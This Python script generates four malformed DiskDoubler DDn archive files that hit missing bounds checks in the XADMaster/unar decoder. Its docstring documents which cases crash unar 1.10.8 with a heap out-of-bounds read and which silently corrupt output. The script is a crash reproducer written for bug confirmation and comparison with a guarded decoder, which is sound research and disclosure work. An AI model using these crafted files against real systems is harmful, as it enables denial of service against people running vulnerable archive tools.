#!/usr/bin/env python3
"""Four crafted DDn (DiskDoubler method 10) blocks for the checks
`XADDiskDoublerDDnHandle.m` is missing, each one 148-218 bytes: one
`0xABCD0054` container, one DDn data fork, no reference to any fixture.

Our own `fmt_dd.c` guards all four (commit 7520f9a09, DECISIONS.md
2026-11-03, *the symbols no encoder writes*); that entry's evidence was
UBSan on OUR build, never a run against `unar` itself (none was
installed when it was written). This is that run, against `unar` 1.10.8
and `reference/XADMaster/XADDiskDoublerDDnHandle.m` (MacPaw 7cb9ee0).

    make_repro_unchecked.py -o /tmp/ddn           # writes case_a/b/c/d.dd
    unar -f /tmp/ddn/case_d.dd                    # unar 1.10.8: segfault

A real DDn block cannot carry any of the four: a correct encoder's
length-code stream is driven by the same literal/offset counts it writes
as `numliterals`/`numoffsets`, and a block ends exactly when its own
`uncompsize` bytes have been produced (`tools/derive_dd.py` `fork()`,
which raises on an empty block rather than accept one). Reaching any of
these needs a corrupted or crafted stream.

a) offset slot >= 32: `(2+(slot&1))<<bits` is unbounded, and the result
   is truncated to `uint16_t offsetptr[]`. CONFIRMED (mechanism): unar
   writes the wrong bytes, exit 0, no error. Not a crash — every window
   access in `XADLZSSHandle` is `&windowmask`, so a garbage *offset*
   value is masked into the window, never read or written out of
   bounds.
b) length code >= 159: `int length=1<<(code-128)` overflows a signed
   int. CONFIRMED AS A CRASH, same fault site as (d): with the block's
   own `uncompsize` large enough that the corrupted `literalsleft` is
   not capped by the fork's declared total length first, `literalptr`
   walks off the end of the handle's buffer.
c) offset slot 31 with every extra bit set: 65,536, stored as 0 in
   `uint16_t offsetptr[]`. `offset>pos` passes a 0, and the match reads
   `windowbuffer[pos&windowmask]` — the byte about to be written at that
   position, read before it is. CONFIRMED (mechanism): unar writes
   zeros there (the window starts zeroed), not the bytes that would
   follow in a correct decode. Not a crash, for the reason (a) is not.
d) `literalptr`/`offsetptr` are read with no check against
   `numliterals`/`numoffsets` ("// TODO: check for literals left",
   three times). A block with one literal and a length-code run of
   millions walks `literalptr` past the handle's own
   `uint8_t buffer[0x10000]`. CONFIRMED AS A CRASH: unar 1.10.8
   segfaults reading one byte off the end of a heap allocation, after
   writing some of the declared output (reproduced 3/3 runs; same fault
   instruction and address as (b)).

Source: reference/XADMaster/XADDiskDoublerDDnHandle.m
        -readBlockAtPosition: and -nextLiteralOrOffset:andLength:atPosition:
Source: reference/XADMaster/XADLZSSHandle.m  windowbuffer[x&windowmask]
Source: src/fmt_dd.c  dd_ddn_run (the same four checks, present)
"""
import argparse
import os
import struct
import sys

MAGIC = 0xABCD0054


class _BitW:
    """MSB-first bit writer, matching UncBitIn/CSInputNextBitString."""
    def __init__(self):
        self.acc = 0
        self.n = 0
        self.out = bytearray()

    def bits(self, val, n):
        for i in range(n - 1, -1, -1):
            self.acc = (self.acc << 1) | ((val >> i) & 1)
            self.n += 1
            if self.n == 8:
                self.out.append(self.acc)
                self.acc = 0
                self.n = 0

    def flush(self):
        if self.n:
            self.acc <<= (8 - self.n)
            self.out.append(self.acc)
            self.acc = 0
            self.n = 0
        return bytes(self.out)


def _canon(lengths):
    """{symbol: (code, length)}, codes assigned in (length, symbol)
    order, shortest all-zeros — `unc_canon_build`'s convention, which
    `readCode`'s `shortestCodeIsZeros:YES` matches."""
    syms = sorted(lengths, key=lambda s: (lengths[s], s))
    out, code, prev = {}, 0, None
    for s in syms:
        length = lengths[s]
        if prev is not None:
            code <<= (length - prev)
        out[s] = (code, length)
        code += 1
        prev = length
    return out


def _code_section(nsyms, lengths, symbol_stream_bits, numbits=5, maxlength=15):
    """One `readCode` descriptor (4-byte head, then code lengths, 5 bits
    each, no zero-coding) followed by `symbol_stream_bits` — a `_BitW`
    already holding the canonical-coded symbols for this section."""
    lb = _BitW()
    for s in range(nsyms):
        lb.bits(lengths.get(s, 0), numbits)
    lenbytes = lb.flush()
    symbytes = symbol_stream_bits.flush()
    head = ((nsyms - 1) << 24) | (len(lenbytes) << 13) | (maxlength << 8) \
        | (numbits << 3)
    return struct.pack(">I", head) + lenbytes + symbytes


def _offsets_section(nsyms, lengths, slot, extrabits=0, extraval=0):
    cmap = _canon({s: length for s, length in lengths.items() if length})
    sb = _BitW()
    code, length = cmap[slot]
    sb.bits(code, length)
    if extrabits:
        sb.bits(extraval, extrabits)
    return _code_section(nsyms, lengths, sb)


def _literals_section(data):
    """Uncompressed literals (`flags & 0x80 == 0`): raw bytes, no code."""
    return bytes(data)


def _lengths_section(nsyms, lengths, symbols):
    sb = _BitW()
    cmap = _canon({s: length for s, length in lengths.items() if length})
    for sym in symbols:
        code, length = cmap[sym]
        sb.bits(code, length)
    return _code_section(nsyms, lengths, sb)


def _block(uncompsize, numliterals, numoffsets, offset_sec, literal_sec,
          length_sec):
    body = (struct.pack(">I", uncompsize)
            + struct.pack(">H", numliterals)
            + struct.pack(">H", numoffsets)
            + struct.pack(">H", len(length_sec))
            + struct.pack(">H", len(literal_sec))
            + struct.pack(">H", len(offset_sec))
            + bytes(7))            # flags=0 (compressed), 6 pad/xor bytes
    hx = 0
    for b in body:
        hx ^= b
    return body + bytes([hx]) + offset_sec + literal_sec + length_sec


def _crc16(d):
    crc = 0
    for x in d:
        crc ^= x << 8
        for _ in range(8):
            crc = ((crc << 1) ^ 0x1021) & 0xFFFF if crc & 0x8000 \
                else (crc << 1) & 0xFFFF
    return crc


def _container(ddn_data, uncomplen, name=b"case"):
    """One `0xABCD0054` file header around one DDn data fork, no
    resource fork — the same 84-byte layout `tools/synth_dd.py`'s
    `_file_header` writes, method 10."""
    h = bytearray(80)
    h[0:4] = struct.pack(">I", uncomplen)
    h[4:8] = struct.pack(">I", len(ddn_data))
    h[16] = 10                      # data method = DDn
    h[20:24] = struct.pack(">I", 0xA000)
    h[24:28] = struct.pack(">I", 0xA000)
    h[28:32] = b"TEXT"
    h[32:36] = b"ttxt"
    out = bytearray(struct.pack(">I", MAGIC) + bytes(h))
    out[82:84] = struct.pack(">H", _crc16(out[:82]))
    return bytes(out) + ddn_data


def case_a(slot=64):
    """One match whose offset slot (64) is past the 32 a correct
    4-bit-ish offset code ever assigns."""
    pre = b"ABCDEFGH"
    bits = slot // 2 - 1
    off = _offsets_section(slot + 1, {slot: 1, 0: 1}, slot, bits, 0)
    length = _lengths_section(2, {0: 1, 1: 1}, [0] * len(pre) + [1])
    blk = _block(len(pre) + 3, len(pre), 1, off, _literals_section(pre),
                length)
    return _container(blk, len(pre) + 3)


def case_b(outer_uncompsize=0x400000):
    """One length code of 159: `1<<31` as a 32-bit signed int. The
    block's OWN declared size has to be large too, or the fork's total
    output length caps the walk before `literalptr` leaves the buffer."""
    off = _code_section(2, {0: 1, 1: 1}, _BitW())
    length = _lengths_section(160, {159: 1, 0: 1}, [159])
    blk = _block(outer_uncompsize, 1, 0, off, _literals_section(b"Z"),
                length)
    return _container(blk, outer_uncompsize)


def case_c():
    """One match whose offset slot (31) with its full 14 extra bits set
    decodes to 65,536, which `uint16_t offsetptr[]` holds as 0."""
    pre = b"ABCDEFGH"
    off = _offsets_section(32, {31: 1, 0: 1}, 31, 14, (1 << 14) - 1)
    length = _lengths_section(2, {0: 1, 1: 1}, [0] * len(pre) + [1])
    blk = _block(len(pre) + 3, len(pre), 1, off, _literals_section(pre),
                length)
    return _container(blk, len(pre) + 3)


def case_d(uncompsize=0x400000):
    """One literal (`numliterals=1`) and a length code (150) whose run
    is `1<<22` literals — legal arithmetic, no overflow, just more
    literals than the block declared."""
    off = _code_section(2, {0: 1, 1: 1}, _BitW())
    length = _lengths_section(160, {150: 1, 0: 1}, [150])
    blk = _block(uncompsize, 1, 0, off, _literals_section(b"Z"), length)
    return _container(blk, uncompsize)


CASES = {"a": case_a, "b": case_b, "c": case_c, "d": case_d}


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("-o", required=True, help="output directory")
    ap.add_argument("--only", choices=sorted(CASES), help="one case only")
    a = ap.parse_args()
    os.makedirs(a.o, exist_ok=True)
    for k in (sorted(CASES) if not a.only else [a.only]):
        data = CASES[k]()
        p = os.path.join(a.o, "case_%s.dd" % k)
        open(p, "wb").write(data)
        print("wrote %s (%d B)" % (p, len(data)))
    return 0


if __name__ == "__main__":
    sys.exit(main())
